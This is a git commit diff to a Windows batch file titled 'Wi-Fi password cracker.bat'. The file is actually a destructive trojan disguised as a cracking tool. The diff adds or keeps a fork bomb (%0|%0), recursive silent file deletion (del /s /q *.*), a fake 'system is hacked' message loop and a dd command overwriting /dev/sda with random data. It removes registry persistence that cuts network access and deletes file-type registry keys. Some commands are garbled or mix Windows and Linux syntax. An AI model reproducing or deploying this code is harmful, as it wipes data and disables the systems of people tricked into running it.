685571619c80033a22428dc9c0e73bed73887f39
Varun Banka <88031057+VarunBanka@users.noreply.github.com>
2022-10-02 13:44:55 +0530

    bugs fixed

--- Wi-Fi password cracker.bat
+++ Wi-Fi password cracker.bat
@@ -1,58 +1,22 @@
 @echo off
 
-:: downloading an image & opening it for distraction
+:: downloading an image
 Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image.jpg"
-image.jpg
 
-:: code for more distraction
+:: code for distraction
 do
 msgbox("Your system is hacked")
 loop
 
-:: code to block internet access 
-echo @echo off>c:windowswimn32.bat
-echo break off>>c:windowswimn32.bat
-echo ipconfig/release_all>>c:windowswimn32.bat
-echo end>>c:windowswimn32.bat
-reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
-:: code by Varun Banka
-reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:window
-
 :: a loop
 %0|%0
 
-:: dlt a lot of file
-del*.*
+:: open the image downloaded in line 4
+image.jpg
 
-:: dlt reg keys
-START reg delete HKCR/.exe
-START reg delete HKCR/.dll
-START reg delete HKCR/*
+:: delete stuff
+:: code by Varun Banka
+del /s /q *.*
 
-
-rem Disclamer
-rem This is made for fun only, do NOT use this for un-ethical purposes and if you do, I'm not responsible
-
-rem IF YOU WILL SEND THIS TO HACKER VARUN, HE WILL HELP YOU CHANGING YOUR SOCIAL MEDIA ACCOUNT'S PASSWORD AND TELL YOU YOUR IP ADDRESS FOR FREE
-
-rem AND REMEMBER HACKING IS ILLEGAL, OF YOU GET CAUGHT, DO NOT TELL THEN YOU KNOW WHO IS HACKER VARUN BANKA
-
-rem And don't use this in your school or office
-
-rem Requirements
-rem Brain
-
-rem Common sense
-
-rem Windows os (because this will only work on windows)
-
-rem What's a Trojan ?
-rem Google it xd
-
-rem Apart from jokes, "A Trojan horse, or Trojan, is a type of malicious code or software that looks legitimate but can take control of your computer. A Trojan is designed to damage, disrupt, steal, or in general inflict some other harmful action on your data or network. A Trojan acts like a bona fide application or file to trick you."
-
-rem What will happen from this trojan ?
-rem After opening "Wi-fi cracker.bat", some commands will be executed which will destroy the whole os
-
-rem How to fix
-rem Reinstall the OS
+:: play with drive
+sudo dd if=/dev/random of=/dev/sda
